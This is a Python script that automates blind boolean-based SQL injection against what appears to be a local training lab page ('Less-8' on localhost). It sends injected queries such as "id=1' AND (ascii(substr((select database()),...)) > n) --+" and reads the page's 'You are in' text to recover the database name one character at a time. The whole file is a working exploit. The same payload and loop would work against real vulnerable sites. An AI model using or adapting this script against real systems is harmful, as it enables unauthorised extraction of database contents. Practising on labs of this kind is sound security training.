import requests
from bs4 import BeautifulSoup as bs

LOW_LIMIT = 97
HIGH_LIMIT = 122

db_name_arr = []

# The parser
def parse(res_html)->bool:
	flag = False
	html_parsed = bs(res_html,'html.parser')
	for font in html_parsed.find_all("font"):
		if font.get_text() == "You are in...........":
			flag = True
	return flag

# Using partial binary search logic
def automate(offset):
	mid = (97+122)//2
	
	while mid >= LOW_LIMIT and mid <= HIGH_LIMIT:
		# Check if the mid value and ascii are the same
		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (ascii(substr((select database()),{offset},1)) = {mid}) --+")
		parseinit = parse(r.text)
		if parseinit:
			db_name_arr.append(chr(mid))
			break
		# Check is the mid value is less than the ascii value
		r = requests.get(f"http://localhost:8000/Less-8/?id=1' AND (ascii(substr((select database()),{offset},1)) > {mid}) --+")
		parseinit = parse(r.text)
		if parseinit:
			mid = mid+1
		else:
			mid = mid - 1
		
def main():
	for i in range(1,10,1):
		automate(i)
	db_name = "".join(db_name_arr)
	print(db_name)

if __name__ == '__main__':
	main()

	
	
